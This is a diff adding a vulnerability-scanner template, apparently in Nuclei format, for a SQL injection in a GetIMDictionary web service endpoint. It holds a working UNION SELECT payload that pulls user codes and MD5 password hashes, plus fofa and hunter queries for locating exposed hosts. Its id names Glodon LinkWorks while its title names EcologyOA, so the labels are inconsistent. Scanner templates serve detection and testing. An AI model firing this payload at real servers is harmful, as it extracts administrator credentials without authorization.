@@ -1,0 +1,35 @@
+id: glodon-linkworks-GetIMDictionary-sqli
+
+info:
+  name: EcologyOA filedownloadforoutdoc - SQL injection
+  author: Co5mos
+  severity: critical
+  description: EcologyOA filedownloadforoutdoc interface has SQL injection
+  reference:
+    - https://blog.csdn.net/2301_79099363/article/details/131692158
+  metadata:
+    max-request: 2
+    verified: true
+    hunter-query: product.name="泛微 e-cology 9.0 OA"
+    fofa: body="/Services/Identification/"
+  tags: ecology-oa,sqli
+
+http:
+  - raw:
+      - |
+        POST /Webservice/IM/Config/ConfigService.asmx/GetIMDictionary HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        key=1' UNION ALL SELECT top 1 concat(F_CODE,':',F_PWD_MD5) from T_ORG_USER --
+
+    matchers-condition: and
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "value=\"admin:(\\w{32})\""
+
+      - type: status
+        status:
+          - 200
